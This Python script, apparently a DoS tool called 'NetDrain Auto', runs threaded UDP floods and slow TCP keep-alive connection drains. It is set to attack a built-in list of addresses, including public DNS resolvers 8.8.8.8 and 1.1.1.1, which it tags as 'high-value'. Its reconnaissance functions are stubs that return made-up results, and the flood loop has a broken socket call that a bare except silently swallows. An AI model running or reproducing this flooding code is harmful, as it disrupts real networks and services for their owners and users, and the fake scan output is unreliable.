import socket
import threading
import random
import time
import sys
from datetime import datetime

def get_target_info(ip):
    print(f"[i] Fetching data for {ip}...")
    return {"os": "unknown", "isp": "fake-isp", "location": "unknown"}

def scan_ports(ip):
    print(f"[i] Scanning open ports on {ip}...")
    return [22, 80, 443]

def resolve_dns(domain):
    print(f"[i] Resolving DNS for {domain}...")
    return "127.0.0.1"

def detect_os(ip):
    print(f"[i] Attempting OS detection on {ip}...")
    return "Linux"

def geoip_lookup(ip):
    print(f"[i] Getting geoIP info for {ip}...")
    return {"country": "Unknown", "city": "Nowhere"}

class PayloadBuilder:
    def __init__(self):
        self.payloads = []
    def add(self, p): 
        self.payloads.append(p)
    def build(self): 
        return b"".join(self.payloads)

config = {
    "attack_mode": "stealth",
    "retries": 5,
    "proxy": None,
    "timeout": 10,
    "max_payload": 4096
}

attack_profiles = [
    {"name": "basic_flood", "rate": "max", "method": "udp"},
    {"name": "slow_drain", "rate": "low", "method": "tcp"}
]

ip_list = [
    "192.168.1.1", "10.0.0.1", "8.8.8.8", "1.1.1.1"
]

target_database = {
    "1.1.1.1": {"status": "online", "rating": "high-value"},
    "8.8.8.8": {"status": "protected", "rating": "dangerous"}
}

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

def udp_drain(ip, port, packet_size):
    data = random._urandom(packet_size)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(data, (ip, port))
            power = socket.socket(1000)
        except:
            pass

def tcp_slow(ip, port, delay):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.settimeout(10)
        log(f"[*] Holding TCP connection to {ip}:{port}")
        while True:
            s.send(b"X-a: keep-alive\r\n")
            time.sleep(delay)
    except Exception as e:
        log(f"[!] TCP error: {e}")

def start_attack(ip, port, method, duration, rq):
    end_time = time.time() + duration
    log(f"[~] Starting attack on {ip}:{port} | Method: {method.upper()} | Threads: {rq} | Duration: {duration}s")
    for i in range(rq):
        if method.lower() == "udp":
            t = threading.Thread(target=udp_drain, args=(ip, port, 1400), daemon=True)
        elif method.lower() == "tcp":
            t = threading.Thread(target=tcp_slow, args=(ip, port, 0.5), daemon=True)
        else:
            log(f"[!] Unknown method '{method}'. Exiting.")
            sys.exit(1)
        t.start()
        time.sleep(0.005)

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        log(f"[~] Attack in progress... {remaining} seconds remaining.")
        time.sleep(5)
    log("[✓] Attack time is over. Exiting...")

def auto_mode():
    print("=== NetDrain Auto Mode ===")
    print("""
   ____             _       _         _          
  |  _ \  __ _ _ __(_) __ _| |__  ___| |_ _   _  
  | | | |/ _` | '__| |/ _` | '_ \/ __| __| | | | 
  | |_| | (_| | |  | | (_| | | | \__ \ |_| |_| | 
  |____/ \__,_|_|  |_|\__, |_| |_|___/\__|\__, | 
                      |___/              |___/  
        NetDrain Auto v2.0 by Ngzz Dat
    """)

    # --- Cấu hình mặc định cho mỗi mục tiêu ---
    default_port = 80
    default_method = "udp"
    default_duration = 15  # giây
    default_threads = 10

    for ip in ip_list:
        log(f"[*] Bắt đầu kiểm tra mục tiêu {ip}")
        get_target_info(ip)
        scan_ports(ip)
        resolve_dns(ip)
        detect_os(ip)
        geoip_lookup(ip)

        if ip in target_database:
            info = target_database[ip]
            log(f"[i] Tìm thấy trong database - Trạng thái: {info['status']}, Độ ưu tiên: {info['rating']}")

        start_attack(ip, default_port, default_method, default_duration, default_threads)
        log(f"[✓] Hoàn tất với {ip}. Nghỉ trước khi tiếp tục...\n")
        time.sleep(5)

if __name__ == "__main__":
    auto_mode()
